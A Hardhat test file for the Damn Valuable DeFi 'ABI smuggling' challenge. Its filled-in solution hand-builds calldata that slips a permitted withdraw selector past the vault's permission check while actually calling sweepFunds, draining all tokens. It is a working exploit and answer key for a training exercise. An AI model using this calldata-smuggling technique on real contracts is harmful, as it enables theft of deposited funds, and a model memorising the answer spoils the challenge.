const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] ABI smuggling', function () {
    let deployer, player, recovery;
    let token, vault;
    
    const VAULT_TOKEN_BALANCE = 1000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [ deployer, player, recovery ] = await ethers.getSigners();

        // Deploy Damn Valuable Token contract
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();

        // Deploy Vault
        vault = await (await ethers.getContractFactory('SelfAuthorizedVault', deployer)).deploy();
        expect(await vault.getLastWithdrawalTimestamp()).to.not.eq(0);

        // Set permissions
        const deployerPermission = await vault.getActionId('0x85fb709d', deployer.address, vault.address);
        const playerPermission = await vault.getActionId('0xd9caed12', player.address, vault.address);
        await vault.setPermissions([deployerPermission, playerPermission]);
        expect(await vault.permissions(deployerPermission)).to.be.true;
        expect(await vault.permissions(playerPermission)).to.be.true;

        // Make sure Vault is initialized
        expect(await vault.initialized()).to.be.true;

        // Deposit tokens into the vault
        await token.transfer(vault.address, VAULT_TOKEN_BALANCE);

        expect(await token.balanceOf(vault.address)).to.eq(VAULT_TOKEN_BALANCE);
        expect(await token.balanceOf(player.address)).to.eq(0);

        // Cannot call Vault directly
        await expect(
            vault.sweepFunds(deployer.address, token.address)
        ).to.be.revertedWithCustomError(vault, 'CallerNotAllowed');
        await expect(
            vault.connect(player).withdraw(token.address, player.address, 10n ** 18n)
        ).to.be.revertedWithCustomError(vault, 'CallerNotAllowed');
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        const ZERO_PAD = ethers.utils.zeroPad(0, 32);
        const executeFunctionSig = ethers.utils.solidityPack(["bytes4"], ["0x1cff79cd"]);
        const withdrawFunctionSig = ethers.utils.defaultAbiCoder.encode(["bytes4"], ["0xd9caed12"]);
        const vaultAddress = ethers.utils.defaultAbiCoder.encode(["address"], [vault.address]);
        const actionDataOffset = ethers.utils.defaultAbiCoder.encode(["uint256"], [128]);
        const actionDataLength = ethers.utils.defaultAbiCoder.encode(["uint256"], [68]);
        const actionData = vault.interface.encodeFunctionData("sweepFunds", [recovery.address, token.address]);
        const data = ethers.utils.solidityPack(["bytes4", "bytes32", "bytes32", "bytes32", "bytes32", "uint256", "bytes"], 
        [
            executeFunctionSig, 
            vaultAddress, 
            actionDataOffset, 
            ZERO_PAD, 
            withdrawFunctionSig, 
            actionDataLength, 
            actionData
        ]);

        const nonce = await ethers.provider.getTransactionCount(player.address);
        const gasPrice = await ethers.provider.getGasPrice();

        const tx = {
            nonce,
            gasPrice,
            gasLimit: '300000',
            to: vault.address,
            value: 0,
            data
          };
          
        await player.sendTransaction(tx);
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
        expect(await token.balanceOf(vault.address)).to.eq(0);
        expect(await token.balanceOf(player.address)).to.eq(0);
        expect(await token.balanceOf(recovery.address)).to.eq(VAULT_TOKEN_BALANCE);
    });
});
